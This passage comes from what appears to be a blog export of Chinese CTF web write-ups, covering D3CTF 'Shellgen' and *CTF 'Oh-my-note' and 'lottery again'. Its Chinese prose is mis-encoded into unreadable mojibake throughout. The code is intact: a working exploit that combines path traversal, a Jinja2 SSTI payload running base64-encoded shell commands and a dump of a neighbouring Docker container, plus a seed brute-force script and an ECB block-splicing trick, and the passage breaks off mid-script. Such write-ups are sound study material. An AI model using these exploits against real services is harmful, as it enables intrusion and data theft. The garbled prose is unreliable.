src="/2021/03/08/2021-D3CTF/Cd_JSMXDgkuTEPvF09sjnvldT5dRBQ4ovtR3ED0IhLEVP6d6_emdQpAm351h-mxnmC6nyj3_5g0HEvDV9zQChhHFMjIT3TfZZgPJcQd6-cjjoWEPvTl-vnbIsEtd2voMTfJTWiaT.png" alt="img"></p><p><img src="/2021/03/08/2021-D3CTF/CamNVR72syzwTWwiRQJ5OyD1S61zzu9gMyqPOJnygEjqDMlY-R-zHKaHOHTKhelAdQ-rIwVo0GbfsoNKmB5htALIrIeEBzx1p9QY28drCfXuTH9GunkBENjRtSiNPxrTpBrVdvdg.png" alt="img"></p><h2 id="Shellgen"><a href="#Shellgen" class="headerlink" title="Shellgen"></a>Shellgen</h2><p>è·Ÿ misc é‚£é“é¢˜é€»è¾‘åŸºæœ¬å·®ä¸å¤šï¼Œå°±æ˜¯éœ€è¦ rceã€‚</p><p>æºä»£ç é‡Œå‘ç°éƒ¨åˆ†ä¼ªä»£ç ï¼Œå¯ä»¥çœ‹åˆ°pythonå’Œphpçš„æ‰§è¡Œéƒ½æ˜¯åœ¨docker containeré‡Œå®Œæˆçš„ã€‚å…¶ä¸­python ä½¿ç”¨äº† Mount æ¥æŒ‚è½½ç›®å½•ï¼š</p><p><img src="/2021/03/08/2021-D3CTF/f2prKZ6YUJk2oY99Gj2VVPaAbDzGW0DNp072XsKLOPO4oGLKOlq_GcOvRa6zWmO8blk_0vwq0AaN9-XWpAQLqnAsiiqi-oXd6lXK2aHnjeUuXAsxZ4Mzt-bABu4j85zZoJcGkoMw.png" alt="img"></p><p>è¿è¡Œå…¥å®¹å™¨æŒ‡å®šäº† read_onlyã€‚</p><p>æœ¬æ¥ä»¥ä¸ºæŒ‚è½½ç›®å½•åªè¯»ï¼Œå°±æ²¡æƒ³ç”¨è¿™ä¸ªpythonå†™æ–‡ä»¶çš„æ€è·¯ï¼Œä½†æ˜¯åæ¥æœ¬åœ°æµ‹è¯•ä¸€ä¸‹å‘ç°ç«Ÿç„¶å¯ä»¥å†™ï¼Œå¹¶ä¸”å¯ä»¥å†™å…¥å¤–éƒ¨hostä¸­ï¼Œè€½è¯¯äº†å¾ˆä¹…ã€‚èµ›åé—®äº†å‡ºé¢˜äººï¼Œè¿™ä¸ªåªæ˜¯root filesystemåªè¯»ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰mountéƒ½åªè¯»ã€‚</p><p>/result å¤„ä½¿ç”¨äº† render_templateï¼Œé‚£ä¹ˆå¦‚æœæ¸²æŸ“çš„result.htmlæ–‡ä»¶å¯æ§ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ¢æˆæ­£å¸¸sstiçš„payloadï¼Œå°±å¯ä»¥rceã€‚</p><p>å› ä¸ºåˆ›å»ºç›®å½•æ˜¯ token ç›´æ¥ os.path.join æ‹¼æ¥ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ ../ç©¿è¶Šã€‚éœ€è¦æ³¨æ„ render_template ä¼ å…¥çš„æ¨¡ç‰ˆè·¯å¾„å¦‚æœåŒ…å« <code>..</code> å°±ä¼šæŠ¥é”™ã€‚</p><p>æ•´ä¸ªæ”»å‡»çš„é€»è¾‘æœ‰ç‚¹ç»•ï¼š</p><p>ï¼ˆ1ï¼‰é¦–å…ˆæˆ‘ä»¬ token ä¼ å…¥ä¸€ä¸ªéšæœºçš„token: gml/defï¼Œcodeå†™ä»€ä¹ˆéƒ½è¡Œï¼Œsubmitã€‚è¿™æ ·æœåŠ¡å™¨ä¼šåˆ›å»º workdir/gml/def/gen.pyä»¥åŠtemplates/gml/def/result.htmlï¼Œè®°å¾—ä¿ç•™ä¸‹è¿™ä¸ªsessionçš„cookieã€‚</p><p>ï¼ˆ2ï¼‰ç¬¬äºŒæ­¥ï¼Œæˆ‘ä»¬submitçš„tokenæ˜¯../templates/gmlï¼Œè¿™æ ·æœåŠ¡å™¨ä¼šåˆ›å»º workdir/../templates/gml/gen.pyï¼Œä»¥åŠworkdir/../templates/gml/result.htmlï¼ˆå³ templates/gml/result.htmlï¼‰ã€‚æ³¨æ„è¿™æ—¶mountçš„ç›®å½•æ˜¯ workdir/../templates/gmlï¼Œå³templates/gml -&gt; /optï¼Œé‚£ä¹ˆcodeçš„å†…å®¹å†™æˆå‘ /opt/def/result.html å†™å…¥æ•°æ®ï¼Œè¿™æ ·æˆ‘ä»¬å®é™…æ˜¯å‘æœåŠ¡å™¨çš„ templates/gml/def/result.html å†™å…¥äº†æ•°æ®ã€‚</p><p>ï¼ˆ3ï¼‰æœ€åå¸¦ç€ç¬¬ä¸€æ­¥ä¿ç•™çš„tokenä¸ºgml/def çš„cookie å»è®¿é—® /resultï¼Œè§¦å‘render_templateï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</p><p>è¿™é‡Œæ¶‰åŠä¸€äº›detail:</p><p>ï¼ˆ1ï¼‰åœ¨ç¬¬ä¸€æ­¥æ—¶ï¼Œæ³¨æ„submitåä¸è¦å¸¦ç€tokenæ˜¯gml/defçš„sessionå»è®¿é—® /result å»checkç»“æœï¼Œå› ä¸º render_template æœ‰ç¼“å­˜ï¼Œåé¢å³ä½¿æˆ‘ä»¬æ›´æ”¹äº† result.htmlï¼Œä¹Ÿä¸ä¼šé‡æ–°æ¸²æŸ“äº†ã€‚</p><p>ï¼ˆ2ï¼‰ç¬¬ä¸€æ­¥submitåï¼Œéœ€è¦ç­‰ä¸€ä¸‹ï¼Œè®©æœåŠ¡å™¨è¿è¡Œå®Œpythonï¼ŒæŠŠresult.htmlå†™å…¥åå†è¿›è¡Œç¬¬äºŒéƒ¨ï¼Œå¦åˆ™å¦‚æœç¬¬äºŒæ­¥å†™å…¥çš„æ¯”ç¬¬ä¸€æ­¥çš„æ—©ï¼Œé‚£ä¹ˆresult.htmlä¼šè¢«ç¬¬ä¸€æ­¥å†™å…¥å†…å®¹è¦†ç›–ã€‚</p><p>ï¼ˆ3ï¼‰ä¹‹æ‰€ä»¥ç¬¬ä¸€æ­¥çš„tokenåŒ…å«äº†ä¸€å±‚è·¯å¾„ï¼Œæ˜¯ä¸ºäº†é˜²æ­¢åé¢å¹²æ‰°ã€‚å‡å¦‚ç¬¬ä¸€æ­¥çš„tokenæ˜¯gmlï¼Œé‚£ä¹ˆç¬¬äºŒæ­¥é‡Œï¼ŒæœåŠ¡å™¨æœ¬èº«å°±ä¼šå‘template/gml/result.htmlé‡Œå†™ï¼Œpythonè„šæœ¬å†å¾€é‡Œå†™ï¼Œå¯èƒ½ä¼šå­˜åœ¨å¹²æ‰°ã€‚ä½†å¦‚æœåŠ äº†ä¸€å±‚è·¯å¾„ï¼Œå°±å¯ä»¥é¿å…è¿™ä¸ªé—®é¢˜ã€‚</p><p>åœ¨åšè¿™ä¸ªé¢˜çš„æ—¶å€™ï¼Œé‡åˆ°äº†å¾ˆå¤šå‘ã€‚æ¯”å¦‚åˆšæ”¾å‡ºè¿™ä¸ªé¢˜çš„æ—¶å€™ï¼Œæ— è®ºè®©pythonè¾“å‡ºä»€ä¹ˆï¼Œéƒ½è¿”å› detectedï¼Œæ²¡æœ‰è¿‡wrong answerçš„å›æ˜¾ï¼Œç„¶åè¿‡äº†å‡ ä¸ªå°æ—¶ï¼Œå°±å¥½äº†â€¦ åé¢å°è¯•å†™æ–‡ä»¶ï¼Œæ›´ç„å­¦ï¼Œæ„Ÿè§‰é€»è¾‘æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯checkçš„ç»“æœæ˜¾ç¤ºæ²¡å†™è¿›å»ï¼Œå»æ‰¾å‡ºé¢˜äººåé¦ˆï¼Œå‡ºé¢˜äººè¿›é¢˜ç›®ç¯å¢ƒè¯´å·²ç»å†™è¿›å»äº†â€¦ ä¸çŸ¥é“æˆ‘ä»¬è¿™é‡Œä¸ºä»€ä¹ˆè®¿é—® /result check ä¸åˆ°ã€‚</p><p>æœ€åå¹²è„†å†™äº†ä¸ªå¾ªç¯è„šæœ¬ï¼Œä¸€ç›´åœ¨å°è¯•æ”»å‡»ï¼Œpython çš„codeä¹Ÿå†™æˆäº†å¾ªç¯å†™å…¥ï¼Œç»ˆäºæ˜¯åšåˆ°äº†è·‘å‡ æ¬¡èƒ½rceä¸€æ¬¡ï¼ˆåå¼¹shellæ— æœï¼Œcurlä¸pingè¯·æ±‚éƒ½éå¸¸ä¹‹å¡ï¼Œèµ›åé—®äº†ä¸‹æ˜¯é¦™æ¸¯åä»£çš„åŸå› ï¼‰ã€‚</p><p>hintæç¤ºflagåœ¨å¦ä¸€ä¸ªcontaineré‡Œï¼Œä¹Ÿå¼¹ä¸äº†shellï¼Œé¢˜ç›®åˆ äº† docker å‘½ä»¤ï¼Œæ‰€ä»¥ä»¿ç…§é¢˜ç›®ä»£ç ï¼Œä½¿ç”¨dockerclient æ¥ä¸dockeräº¤äº’ï¼Œå‘ç°äº†åä¸º d3ctf-shellgen-flag çš„containerã€‚æ‰§è¡Œä»€ä¹ˆ bashï¼Œshï¼Œpwd å„ç§å‘½ä»¤éƒ½æ˜¾ç¤ºæ‰¾ä¸åˆ°æ–‡ä»¶ã€‚æœ€åç›´æ¥å†™è„šæœ¬æŠŠè¿™ä¸ªcontaineræ‹–ä¸‹æ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time, random, base64, requests</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randid</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(random.randint(<span class="number">10</span>**<span class="number">14</span>, <span class="number">10</span>**<span class="number">15</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">sess</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = sess.get(<span class="string">&#x27;http://d9d2f935ab.shellgen.d3ctf.io/result&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;wait for a sec&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> r.text, time.time()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">py = <span class="string">b&#x27;&#x27;&#x27;from docker import DockerClient, types</span></span><br><span class="line"><span class="string">client = DockerClient()</span></span><br><span class="line"><span class="string">print(client.containers.list())</span></span><br><span class="line"><span class="string">x=client.containers.get(&#x27;d67a893292&#x27;)</span></span><br><span class="line"><span class="string">print(x.id,x.image,x.name,x.status)</span></span><br><span class="line"><span class="string">bits,stat=x.get_archive(&#x27;/&#x27;)</span></span><br><span class="line"><span class="string">print(stat)</span></span><br><span class="line"><span class="string">f=open(&#x27;/tmp/export.tar&#x27;,&#x27;wb&#x27;)</span></span><br><span class="line"><span class="string">for chunk in bits:</span></span><br><span class="line"><span class="string">    f.write(chunk)</span></span><br><span class="line"><span class="string">f.close()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;echo %s | base64 -d | python3&#x27;</span> % base64.b64encode(py).decode()</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">&#x27;echo %s | base64 -d | bash | base64&#x27;</span> % base64.b64encode(cmd.encode()).decode()</span><br><span class="line"> </span><br><span class="line">code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(100):</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        open(&#x27;/opt/def/result.html&#x27;,&#x27;w&#x27;).write(&quot;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(\\&quot;__import__(&#x27;os&#x27;).popen(&#x27;  &#x27;&#x27;&#x27;</span> + cmd + <span class="string">&#x27;&#x27;&#x27; &#x27;).read()\\&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&quot;)</span></span><br><span class="line"><span class="string">    except:</span></span><br><span class="line"><span class="string">        pass</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">print(code)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">id</span> = randid()</span><br><span class="line">    print(<span class="built_in">id</span>)</span><br><span class="line"> </span><br><span class="line">    s3 = requests.Session()</span><br><span class="line">    s3.post(<span class="string">&#x27;http://d9d2f935ab.shellgen.d3ctf.io/submit&#x27;</span>, data=&#123;<span class="string">&#x27;token&#x27;</span>: randid(), <span class="string">&#x27;code&#x27;</span>: <span class="string">&#x27;pass&#x27;</span>&#125;)</span><br><span class="line">    s1 = requests.Session()</span><br><span class="line">    s1.post(<span class="string">&#x27;http://d9d2f935ab.shellgen.d3ctf.io/submit&#x27;</span>, data=&#123;<span class="string">&#x27;token&#x27;</span>: <span class="built_in">id</span> + <span class="string">&#x27;/def&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="string">&#x27;print(&quot;&lt;?php &quot;,end=&quot;&quot;)&#x27;</span>&#125;)</span><br><span class="line">    s2 = requests.Session()</span><br><span class="line">    s2.post(<span class="string">&#x27;http://d9d2f935ab.shellgen.d3ctf.io/submit&#x27;</span>, data=&#123;<span class="string">&#x27;token&#x27;</span>: <span class="string">&#x27;../templates/&#x27;</span> + <span class="built_in">id</span>, <span class="string">&#x27;code&#x27;</span>: code&#125;)</span><br><span class="line">    a, b = check(s3)</span><br><span class="line">    print(b)</span><br><span class="line">    c, d = check(s1)</span><br><span class="line">    print(d)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Wr0ng&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> c:</span><br><span class="line">        <span class="comment">#open(&#x27;out.tar&#x27;, &#x27;wb&#x27;).write(base64.b64decode(c))</span></span><br><span class="line">        print(base64.b64decode(c).decode())</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‹–ä¸‹æ¥æœ¬åœ°å‘ç°æœ‰ä¸ª /getflagï¼Œæ‰§è¡Œå‘ç°éœ€è¦è¾“å…¥tokenï¼Œè¾“å…¥tokenå¾—åˆ°äº† flagï¼Œä½†æ˜¯äº¤ä¸Šå»ä¸å¯¹â€¦</p><p>çŒœæµ‹æ˜¯ä¸æ˜¯å¿…é¡»è¦åœ¨è¿œç¨‹è·‘ï¼Œä½†æ˜¯éœ€è¦è¾“å…¥tokenï¼Œéœ€è¦äº¤äº’ï¼Œæƒ³ç”¨<code>echo xx | /readflag</code>ï¼Œä½†æ˜¯å‘ç° echo éƒ½æ²¡æœ‰ï¼š</p><p><img src="/2021/03/08/2021-D3CTF/telegram-cloud-photo-size-5-6206472350153681829-y.jpg" alt="telegram-cloud-photo-size-5-6206472350153681829-y"></p><p>å°è¯•é€†å‘ç¨‹åºï¼Œå‘ç°ç”Ÿæˆflagçš„é€»è¾‘å¹¶æ²¡æœ‰å¾ˆå¤æ‚ï¼Œæœ¬åœ°ç»“æœå’Œè¿œç¨‹ç»“æœåº”è¯¥æ˜¯ä¸€æ ·çš„ã€‚æœ€åæ‰¾å‡ºé¢˜äººè§£å†³äº†flagé”™è¯¯çš„é—®é¢˜ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> wp </tag>
            
            <tag> D^3CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 *CTF Web é¢˜è§£</title>
      <link href="/2021/01/19/2021-starctf/"/>
      <url>/2021/01/19/2021-starctf/</url>
      
        <content type="html"><![CDATA[<p>å› ä¸ºæˆ˜é˜Ÿä¹‹å‰ XCTF æ²¡æ€ä¹ˆå…¨å‘˜æ‰“ï¼Œæ²¡æœ‰é—¨ç¥¨ï¼Œ*CTFæ˜¯æœ€åä¸€æ¬¡å…¥åœºåˆ¸äº†ï¼Œæ‰€ä»¥å‘¨æœ«è·Ÿé˜Ÿå‹å…¨åŠ›æ‰“äº†ä¸‹ *CTFã€‚æœ‰ç‚¹å¯æƒœï¼Œå·®äº†é“ Webï¼ˆèƒŒé”…â€¦</p><p><img src="/2021/01/19/2021-starctf/image-20210118183846729.png" alt="image-20210118183846729"></p><p>å››é“ Webï¼Œæ„Ÿè§‰é™¤äº† betï¼Œå‰©ä¸‹çš„éƒ½ä¸é‚£ä¹ˆ Webâ€¦</p><a id="more"></a><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Oh-my-note"><a href="#Oh-my-note" class="headerlink" title="Oh-my-note"></a>Oh-my-note</h2><p>å¼€å§‹ä»¥ä¸º SSTI ä¹‹ç±»çš„ï¼Œè¯•äº†ä¸‹å‘ç°ä¸æ˜¯ã€‚</p><p>é€šè¯»ä»£ç ä¹Ÿæ²¡å•¥ç‚¹ï¼Œæœ‰ä¸ªå¥‡æ€ªçš„åœ°æ–¹å°±æ˜¯ä»¥ä¸€ä¸ªå·²ç»å­˜åœ¨çš„ç”¨æˆ·å‘å¸–å­ï¼Œæ²¡æœ‰ç™»é™†çŠ¶æ€â€¦ çŒœæµ‹æ˜¯ä¸æ˜¯é¢˜ç›®å¯åŠ¨æ—¶å€™è‡ªåŠ¨åŠ çš„å¸–å­æœ‰ä¸œè¥¿ã€‚</p><p>æœ‰äº† userid å°±å¯ä»¥çœ‹æ‰€æœ‰å¸–å­äº†ï¼Œçœ‹ä»£ç å‘ç° userid å¯ä»¥çˆ†ç ´å‡ºæ¥ï¼š</p><p><img src="/2021/01/19/2021-starctf/X8zrVVzZLzrH2HYEi8qZUTBqvCv2bp9yMSKCCUf_53DxsMdTx68kq3GnqeME8aZYFxRQkcqK66nwi8SpLJC_iqCiJarpfvOtuX-wgAbkITlpxTb8wpdJPgL4rj1Qv4Jh7DNjL05H-20210118184107665.png" alt="img"></p><p>æ€è·¯å°±æ˜¯æœ‰äº†ä¸‹é¢çš„post_atï¼Œåœ¨é™„è¿‘å»çˆ†ç ´ä¸€ä¸‹å‰é¢çš„timestampï¼Œè¿™æ ·å¯ä»¥å¾—åˆ°user_idäº†ï¼Œç„¶åå¯ä»¥æŸ¥çœ‹å‰é¢é‚£å‡ ä¸ªuserçš„æ–‡ç« ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time, datetime</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_id</span>():</span></span><br><span class="line">    alphabet = <span class="built_in">list</span>(string.ascii_lowercase + string.digits)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([random.choice(alphabet) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post_at = <span class="string">&quot;2021-01-15 02:29 UTC&quot;</span></span><br><span class="line">timeArray = time.strptime(post_at, <span class="string">&quot;%Y-%m-%d %H:%M UTC&quot;</span>)</span><br><span class="line">init = <span class="built_in">int</span>(time.mktime(timeArray) - time.mktime(time.gmtime(<span class="number">0</span>)))</span><br><span class="line"><span class="comment"># print(init)</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">-20</span>,<span class="number">20</span>):</span><br><span class="line">    timestamp = init - j</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">        tmp = <span class="built_in">round</span>(i / <span class="number">10000</span>, <span class="number">4</span>)</span><br><span class="line">        res = timestamp + tmp</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        random.seed(res)</span><br><span class="line">        user_id = get_random_id()</span><br><span class="line">        random.seed(user_id + post_at)</span><br><span class="line">        note_id = get_random_id()</span><br><span class="line">        <span class="comment"># print(note_id)</span></span><br><span class="line">        <span class="keyword">if</span> note_id == <span class="string">&#x27;lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u&#x27;</span>:</span><br><span class="line">            print(user_id)</span><br></pre></td></tr></table></figure><p>æ³¨æ„ä¸‹æ—¶åŒºé—®é¢˜ï¼Œæœ‰äº† useridï¼Œnoteé‡Œæœ‰ flagï¼š</p><img src="/2021/01/19/2021-starctf/uJAfYewzt3kIUrDpkRYuGOq-N6Jz4OAkZz2JYqrLa-lXBiLfRRSomaTKpMUiPhht5W9IkM-V2MCmfGmqGcXuHPFcB10p2fvolci7NeRyryypPyvaisvwVktpem6sBQX46QarnoBh.png" alt="img" style="zoom:50%;"><h2 id="lottery-again"><a href="#lottery-again" class="headerlink" title="lottery again"></a>lottery again</h2><p>2020 0CTFåˆèµ›æ”¹çš„ï¼ŒåŠŸèƒ½é€»è¾‘æ²¡æ”¹ï¼Œå½“æ—¶é¢˜è§£ï¼š<a href="http://igml.top/2020/06/29/2020-TCTF-0CTF/#lottery">http://igml.top/2020/06/29/2020-TCTF-0CTF/#lottery</a> </p><p>2020 0CTFæ”¹çš„ï¼Œå‘ç°é€»è¾‘å‡ ä¹éƒ½æ²¡å˜ï¼Œå…³é”®æ˜¯åŠ å¯†ç®—æ³•å˜äº†ã€‚<code>mcrypt_encrypt(MCRYPT_RIJNDAEL_256, env(&#39;LOTTERY_KEY&#39;), $serilized, MCRYPT_MODE_ECB)</code>è¿™ä¸æ˜¯æ­£å¸¸çš„AESï¼Œå¯†é’¥éœ€è¦32å­—èŠ‚ï¼Œå¹¶ä¸”æ˜æ–‡32å­—èŠ‚ä¸ºä¸€ç»„ã€‚</p><p>æ˜æ–‡æŒ‰ç…§32å­—èŠ‚åˆ†ç»„ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;lottery&quot;</span>:<span class="string">&quot;56505c44-f0d3-492a-b</span></span><br><span class="line"><span class="string">12b-0fa6bfc93c65&quot;</span>,<span class="attr">&quot;user&quot;</span>:<span class="string">&quot;edce28</span></span><br><span class="line"><span class="string">e4-bfea-41c5-8cc5-ec55104b745b&quot;</span>,</span><br><span class="line"><span class="attr">&quot;coin&quot;</span>:<span class="number">19</span>&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥åŠ ä¸€ä¸ªç¬¬äºŒä¸ªåˆ†ç»„ï¼Œææˆè¿™æ ·ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;lottery&quot;</span>:<span class="string">&quot;56505c44-f0d3-492a-b</span></span><br><span class="line"><span class="string">12b-0fa6bfc93c65&quot;</span>,<span class="attr">&quot;user&quot;</span>:<span class="string">&quot;edce28</span></span><br><span class="line"><span class="string">xxxxxxxxxxxxxxxx&quot;</span>,<span class="attr">&quot;user&quot;</span>:<span class="string">&quot;edca28</span></span><br><span class="line"><span class="string">e4-bfea-41c5-8cc5-ec55104b745b&quot;</span>,</span><br><span class="line"><span class="attr">&quot;coin&quot;</span>:<span class="number">19</span>&#125;</span><br></pre></td></tr></table></figure><p>json_loadsæ—¶ï¼Œç¬¬äºŒä¸ªuserä¼šè¦†ç›–æ‰å‰é¢çš„ï¼Œè¿™æ ·åé¢çš„useræˆ‘ä»¬å¯ä»¥å®Œå…¨æ§åˆ¶ï¼ŒæŠŠé’±éƒ½è½¬åˆ°ä¸€ä¸ªè´¦æˆ·å°±è¡Œäº†ã€‚</p><p>ä¸ºäº†åŠ å¿«é€Ÿåº¦ï¼Œå†™äº†ä¸ªå¤šè¿›ç¨‹è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool, Manager, Value</span><br><span class="line"><span class="keyword">import</span> random, string</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://52.149.144.45:8080/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line">    user = <span class="string">&quot;&quot;</span>.join([random.choice(string.printable) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)])</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;password&quot;</span>: user, <span class="string">&quot;username&quot;</span>: user&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: url, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span 